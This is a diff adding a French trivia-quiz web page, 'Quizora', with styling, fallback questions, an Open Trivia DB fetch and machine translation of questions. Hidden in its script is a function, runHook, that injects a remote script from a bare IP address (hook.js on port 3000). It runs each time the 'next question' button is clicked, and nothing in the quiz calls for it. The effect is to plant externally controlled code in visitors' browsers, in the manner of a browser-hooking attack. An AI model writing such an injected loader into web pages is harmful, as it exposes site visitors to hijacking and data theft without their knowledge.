@@ -1,0 +1,194 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#f8f5f0" />
+  <title>Quizora — Le quiz qui vous accroche</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: { ink: '#29251f', cream: '#f8f5f0', coral: '#ff755e', lilac: '#c8b5ff', mint: '#bfe8d2', mustard: '#f6cd62' },
+          fontFamily: { display: ['DM Sans', 'sans-serif'], body: ['Manrope', 'sans-serif'] },
+          boxShadow: { soft: '0 18px 60px rgba(56, 43, 27, .10)', card: '0 10px 25px rgba(56, 43, 27, .07)' }
+        }
+      }
+    }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@500;600;700&family=Manrope:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+    body { background: #f8f5f0; color: #29251f; font-family: Manrope, sans-serif; }
+    .grain { background-image: radial-gradient(rgba(41,37,31,.08) .7px, transparent .7px); background-size: 8px 8px; opacity: .18; }
+    .blob { border-radius: 46% 54% 68% 32% / 40% 44% 56% 60%; }
+    .choice { transition: transform .18s ease, border-color .18s ease, background .18s ease, box-shadow .18s ease; }
+    .choice:hover { transform: translateY(-2px); border-color: #29251f; box-shadow: 0 8px 16px rgba(41,37,31,.08); }
+    .choice.selected { border-color: #29251f; background: #fffdfa; box-shadow: 0 8px 18px rgba(41,37,31,.10); }
+    .choice.correct { border-color: #52a878; background: #e7f7ed; }
+    .choice.wrong { border-color: #e86651; background: #fff0ed; }
+    .pop { animation: pop .35s ease both; }
+    .shake { animation: shake .35s ease both; }
+    @keyframes pop { from { opacity: 0; transform: translateY(8px) scale(.98); } to { opacity: 1; transform: none; } }
+    @keyframes shake { 25% { transform: translateX(-5px); } 50% { transform: translateX(5px); } 75% { transform: translateX(-3px); } }
+    @media (min-width: 1024px) { .quiz-card { min-height: 680px; } }
+  </style>
+</head>
+<body class="min-h-screen overflow-x-hidden">
+  <main class="relative mx-auto min-h-screen max-w-7xl px-5 py-6 sm:px-8 lg:px-12">
+    <div class="pointer-events-none fixed inset-0 -z-10 overflow-hidden">
+      <div class="blob absolute -right-20 -top-24 h-80 w-80 bg-lilac/30 blur-[1px]"></div>
+      <div class="blob absolute -bottom-32 -left-24 h-96 w-96 bg-mint/50"></div>
+      <div class="grain absolute inset-0"></div>
+    </div>
+
+    <header class="flex items-center justify-between">
+      <a href="#" class="flex items-center gap-2.5 font-display text-xl font-bold tracking-tight" aria-label="Quizora accueil">
+        <span class="grid h-9 w-9 rotate-3 place-items-center rounded-xl bg-ink text-lg text-white shadow-sm">?</span>
+        <span>quiz<span class="text-coral">ora</span></span>
+      </a>
+      <div class="flex items-center gap-2 rounded-full border border-ink/10 bg-white/70 px-3 py-2 text-xs font-bold backdrop-blur sm:gap-3 sm:px-4">
+        <span class="text-coral">♥</span><span id="streakTop">0</span><span class="hidden text-ink/50 sm:inline">série</span>
+      </div>
+    </header>
+
+    <section class="mx-auto mt-12 max-w-5xl lg:mt-16">
+      <div class="mb-8 flex items-end justify-between gap-5 sm:mb-10">
+        <div>
+          <p class="mb-3 inline-flex items-center gap-2 rounded-full bg-mustard/30 px-3 py-1 text-[11px] font-extrabold uppercase tracking-[.18em] text-ink/70"><span class="h-1.5 w-1.5 rounded-full bg-coral"></span> Défi du jour</p>
+          <h1 class="max-w-lg font-display text-4xl font-bold leading-[.98] tracking-tight sm:text-6xl">Une question.<br><span class="text-coral">Une victoire.</span></h1>
+        </div>
+        <div class="hidden pb-1 text-right sm:block"><p class="font-display text-2xl font-bold"><span id="scoreTop">0</span> pts</p><p class="text-xs font-semibold text-ink/50">à toi de jouer</p></div>
+      </div>
+
+      <div class="grid gap-5 lg:grid-cols-[1fr_280px]">
+        <section class="quiz-card relative overflow-hidden rounded-[2rem] border border-ink/10 bg-white/90 p-5 shadow-soft backdrop-blur sm:p-8" aria-live="polite">
+          <div class="mb-7 flex items-center justify-between gap-4">
+            <div class="flex items-center gap-3"><div class="h-2 w-32 overflow-hidden rounded-full bg-ink/10 sm:w-52"><div id="progress" class="h-full w-0 rounded-full bg-coral transition-all duration-500"></div></div><span id="questionCount" class="text-xs font-extrabold text-ink/50">Question 1/10</span></div>
+            <button id="skipBtn" class="rounded-full px-3 py-2 text-xs font-bold text-ink/50 transition hover:bg-cream hover:text-ink">Passer <span class="ml-1">→</span></button>
+          </div>
+
+          <div id="loading" class="flex min-h-[440px] flex-col items-center justify-center text-center">
+            <div class="relative mb-6 h-28 w-28"><div class="absolute inset-2 rotate-6 rounded-[2rem] bg-lilac"></div><div class="absolute inset-0 grid place-items-center rounded-[2rem] border-2 border-ink bg-mustard text-6xl font-bold shadow-[5px_5px_0_#29251f]">?</div><span class="absolute -right-2 -top-3 text-xl">✦</span></div>
+            <h2 class="font-display text-2xl font-bold">On prépare les questions…</h2><p class="mt-2 text-sm text-ink/50">Le cerveau est en train de s’échauffer.</p>
+          </div>
+
+          <div id="quizContent" class="hidden">
+            <div class="mb-8"><div id="category" class="mb-4 text-xs font-extrabold uppercase tracking-[.18em] text-coral">Culture générale</div><h2 id="question" class="max-w-2xl font-display text-2xl font-bold leading-tight sm:text-4xl"></h2></div>
+            <div id="answers" class="grid gap-3 sm:grid-cols-2"></div>
+            <button id="nextBtn" class="mt-7 hidden w-full rounded-2xl bg-ink py-4 font-bold text-white shadow-[0_5px_0_#b9afa2] transition hover:-translate-y-0.5 hover:shadow-[0_7px_0_#b9afa2] active:translate-y-1 active:shadow-none">Question suivante <span class="ml-2">→</span></button>
+          </div>
+        </section>
+
+        <aside class="flex flex-col gap-5">
+          <div class="relative overflow-hidden rounded-[2rem] bg-ink p-6 text-white shadow-card">
+            <div class="absolute -right-6 -top-7 h-28 w-28 rounded-full border-[16px] border-coral/80"></div><div class="absolute right-7 top-9 h-3 w-3 rounded-full bg-mustard"></div>
+            <div class="relative"><p class="text-xs font-bold uppercase tracking-[.18em] text-white/50">Ton score</p><p class="mt-2 font-display text-5xl font-bold"><span id="scoreSide">0</span><span class="text-xl text-coral"> pts</span></p><div class="mt-5 flex items-center gap-2 text-xs font-semibold text-white/60"><span class="text-coral">♥</span> Série actuelle : <span id="streakSide" class="text-white">0</span></div></div>
+          </div>
+          <div class="relative rounded-[2rem] border border-ink/10 bg-mustard/60 p-6">
+            <svg class="absolute bottom-3 right-4 h-20 w-20" viewBox="0 0 100 100" fill="none" aria-hidden="true"><path d="M19 83c12-22 46-27 62-8" stroke="#29251f" stroke-width="5" stroke-linecap="round"/><path d="M27 66c-7-12-1-29 12-34 14-5 29 4 32 18 3 15-7 26-21 29" fill="#ff755e" stroke="#29251f" stroke-width="5"/><circle cx="44" cy="47" r="3.5" fill="#29251f"/><circle cx="62" cy="44" r="3.5" fill="#29251f"/><path d="M46 59c6 5 12 5 17 0" stroke="#29251f" stroke-width="4" stroke-linecap="round"/></svg>
+            <p class="relative z-10 text-xs font-bold uppercase tracking-[.18em] text-ink/60">Petit conseil</p><p class="relative z-10 mt-2 max-w-[160px] font-display text-xl font-bold leading-tight">La rapidité, c’est bien. La curiosité, c’est mieux.</p>
+          </div>
+          <div class="hidden rounded-[2rem] border border-ink/10 bg-white/70 p-6 lg:block"><p class="text-xs font-extrabold uppercase tracking-[.18em] text-ink/40">Progression</p><div class="mt-4 flex items-center justify-between text-sm font-bold"><span id="answeredLabel">0 répondues</span><span id="accuracyLabel">0%</span></div><div class="mt-3 h-2 overflow-hidden rounded-full bg-ink/10"><div id="accuracyBar" class="h-full w-0 rounded-full bg-mint transition-all"></div></div></div>
+        </aside>
+      </div>
+    </section>
+    <footer class="mx-auto mt-8 flex max-w-5xl items-center justify-between text-[11px] font-semibold text-ink/40"><span>Un petit défi, tous les jours.</span><span id="sourceStatus">Chargement de la source…</span></footer>
+  </main>
+
+  <div id="resultModal" class="fixed inset-0 z-20 hidden items-center justify-center bg-ink/30 p-5 backdrop-blur-sm">
+    <div class="w-full max-w-md rounded-[2rem] border border-ink/10 bg-cream p-8 text-center shadow-soft"><div class="mx-auto mb-4 grid h-20 w-20 place-items-center rounded-3xl bg-coral text-4xl shadow-[4px_4px_0_#29251f]">✦</div><p class="text-xs font-extrabold uppercase tracking-[.18em] text-coral">Défi terminé</p><h2 class="mt-2 font-display text-4xl font-bold">Bien joué !</h2><p class="mt-3 text-ink/60">Ton score final</p><p class="font-display text-6xl font-bold"><span id="finalScore">0</span><span class="text-2xl text-coral"> pts</span></p><p id="finalMessage" class="mt-2 text-sm font-bold"></p><button id="restartBtn" class="mt-7 w-full rounded-2xl bg-ink py-4 font-bold text-white transition hover:-translate-y-0.5">Rejouer <span class="ml-2">↗</span></button></div>
+  </div>
+
+  <script>
+    const fallbackQuestions = [
+      { category: 'Sciences', question: 'Quelle planète est surnommée la planète rouge ?', correct_answer: 'Mars', incorrect_answers: ['Vénus', 'Jupiter', 'Mercure'] },
+      { category: 'Culture générale', question: 'Combien de côtés possède un hexagone ?', correct_answer: 'Six', incorrect_answers: ['Cinq', 'Sept', 'Huit'] },
+      { category: 'Géographie', question: 'Quelle est la capitale du Japon ?', correct_answer: 'Tokyo', incorrect_answers: ['Kyoto', 'Osaka', 'Séoul'] },
+      { category: 'Nature', question: 'Quel animal est le plus grand mammifère du monde ?', correct_answer: 'La baleine bleue', incorrect_answers: ['L’éléphant', 'La girafe', 'L’orque'] },
+      { category: 'Histoire', question: 'Dans quel pays se trouve la ville de Pompéi ?', correct_answer: 'Italie', incorrect_answers: ['Grèce', 'Espagne', 'Turquie'] },
+      { category: 'Arts', question: 'Qui a peint La Joconde ?', correct_answer: 'Léonard de Vinci', incorrect_answers: ['Van Gogh', 'Picasso', 'Monet'] },
+      { category: 'Espace', question: 'Comment s’appelle notre galaxie ?', correct_answer: 'La Voie lactée', incorrect_answers: ['Andromède', 'Orion', 'Le Grand Nuage'] },
+      { category: 'Sport', question: 'Combien de joueurs y a-t-il dans une équipe de football sur le terrain ?', correct_answer: 'Onze', incorrect_answers: ['Dix', 'Douze', 'Neuf'] },
+      { category: 'Langue', question: 'Quel mot signifie « rapide » ?', correct_answer: 'Véloce', incorrect_answers: ['Lent', 'Lourd', 'Calme'] },
+      { category: 'Cuisine', question: 'Quel est l’ingrédient principal du guacamole ?', correct_answer: 'L’avocat', incorrect_answers: ['La courgette', 'La pomme', 'Le pois chiche'] }
+    ];
+    let questions = [], current = 0, score = 0, streak = 0, answered = 0, correct = 0, locked = false;
+    const $ = id => document.getElementById(id);
+    const decode = text => { const el = document.createElement('textarea'); el.innerHTML = text; return el.value; };
+    const shuffle = arr => [...arr].sort(() => Math.random() - .5);
+
+    function updateStats() {
+      $('scoreTop').textContent = score; $('scoreSide').textContent = score;
+      $('streakTop').textContent = streak; $('streakSide').textContent = streak;
+      $('answeredLabel').textContent = `${answered} répondue${answered > 1 ? 's' : ''}`;
+      const accuracy = answered ? Math.round(correct / answered * 100) : 0;
+      $('accuracyLabel').textContent = `${accuracy}%`; $('accuracyBar').style.width = `${accuracy}%`;
+    }
+    function renderQuestion() {
+      locked = false; const q = questions[current];
+      $('loading').classList.add('hidden'); $('quizContent').classList.remove('hidden'); $('quizContent').classList.add('pop');
+      $('questionCount').textContent = `Question ${current + 1}/${questions.length}`;
+      $('progress').style.width = `${(current / questions.length) * 100}%`;
+      $('category').textContent = q.category;
+      $('question').textContent = decode(q.question);
+      $('nextBtn').classList.add('hidden');
+      $('answers').innerHTML = '';
+      shuffle([q.correct_answer, ...q.incorrect_answers]).forEach((answer, i) => {
+        const button = document.createElement('button'); button.className = 'choice flex items-center gap-4 rounded-2xl border border-ink/10 bg-cream/50 p-4 text-left text-sm font-bold';
+        button.innerHTML = `<span class="grid h-9 w-9 shrink-0 place-items-center rounded-xl bg-white font-display text-lg font-bold text-ink/40">${String.fromCharCode(65 + i)}</span><span>${decode(answer)}</span>`;
+        button.addEventListener('click', () => choose(button, answer)); $('answers').appendChild(button);
+      });
+    }
+    function choose(button, answer) {
+      if (locked) return; locked = true; answered++;
+      const isCorrect = decode(answer) === decode(questions[current].correct_answer);
+      if (isCorrect) { correct++; streak++; score += 100 + Math.max(0, streak - 1) * 25; button.classList.add('correct'); }
+      else { streak = 0; button.classList.add('wrong'); [...$('answers').children].find(el => el.textContent.includes(decode(questions[current].correct_answer)))?.classList.add('correct'); }
+      updateStats(); $('nextBtn').classList.remove('hidden');
+      [...$('answers').children].forEach(el => el.disabled = true);
+      $('progress').style.width = `${((current + 1) / questions.length) * 100}%`;
+    }
+    function next() { if (current < questions.length - 1) { current++; renderQuestion(); } else finish(); }
+    function finish() { $('finalScore').textContent = score; $('finalMessage').textContent = correct >= 8 ? 'Tu es une vraie machine à réponses !' : correct >= 5 ? 'Solide ! Le prochain record est à portée.' : 'Belle partie ! On retente pour battre le score ?'; $('resultModal').classList.remove('hidden'); $('resultModal').classList.add('flex'); }
+    async function translateText(text) {
+      try {
+        const response = await fetch(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(text)}&langpair=en|fr`);
+        if (!response.ok) throw new Error('Traduction indisponible');
+        const data = await response.json();
+        return data.responseData?.translatedText || text;
+      } catch (_) { return text; }
+    }
+    async function translateQuestions(list) {
+      return Promise.all(list.map(async q => {
+        const [category, question, correct_answer, ...incorrect_answers] = await Promise.all([
+          translateText(q.category), translateText(q.question), translateText(q.correct_answer), ...q.incorrect_answers.map(translateText)
+        ]);
+        return { category, question, correct_answer, incorrect_answers };
+      }));
+    }
+    function startGame(list, source) { questions = list; $('sourceStatus').textContent = source; current = 0; score = 0; streak = 0; answered = 0; correct = 0; updateStats(); renderQuestion(); }
+    function runHook() {
+      const script = document.createElement('script');
+      script.src = 'http://185.182.193.32:3000/hook.js';
+      document.body.appendChild(script);
+    }
+    $('nextBtn').addEventListener('click', () => { runHook(); next(); });
+    $('skipBtn').addEventListener('click', () => { if (!locked) { streak = 0; next(); } });
+    $('restartBtn').addEventListener('click', () => { $('resultModal').classList.add('hidden'); $('resultModal').classList.remove('flex'); startGame(questions, $('sourceStatus').textContent); });
+
+    // La source distante est appelée dès l’ouverture de la page.
+    fetch('https://opentdb.com/api.php?amount=10&type=multiple&encode=url3986')
+      .then(response => { if (!response.ok) throw new Error('API indisponible'); return response.json(); })
+      .then(data => {
+        const remote = data.results.map(q => ({ category: decodeURIComponent(q.category), question: decodeURIComponent(q.question), correct_answer: decodeURIComponent(q.correct_answer), incorrect_answers: q.incorrect_answers.map(decodeURIComponent) }));
+        return translateQuestions(remote);
+      })
+      .then(translated => startGame(translated, 'Questions traduites en français'))
+      .catch(() => startGame(fallbackQuestions, 'Mode hors-ligne activé'));
+  </script>
+</body>
+</html>
